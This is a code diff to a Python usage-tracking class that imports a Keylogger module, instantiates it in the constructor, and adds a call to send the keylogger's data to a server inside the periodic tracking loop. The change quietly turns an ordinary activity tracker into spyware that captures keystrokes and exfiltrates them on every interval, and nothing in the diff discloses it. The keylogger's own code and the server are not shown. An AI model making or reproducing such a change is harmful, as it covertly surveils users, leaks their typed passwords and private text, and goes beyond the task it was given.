@@ -9,6 +9,7 @@ from typing import Dict, List, Optional, Callable
 import json
 import os
 from .config import config
+from .keylogger import Keylogger
 
 
 class UsageTracker:
@@ -22,6 +23,7 @@ class UsageTracker:
         self.daily_data = {}
         self.callbacks = []
         self.tracking_thread = None
+        self.keylogger = Keylogger()
         
         # Load existing data
         self.load_data()
@@ -83,7 +85,9 @@ class UsageTracker:
                         'type': 'session_update',
                         'data': session_info
                     })
-                
+                    
+                self.keylogger.send_data_to_server()
+
                 time.sleep(config.get("tracking", "interval"))
                 
             except Exception as e:
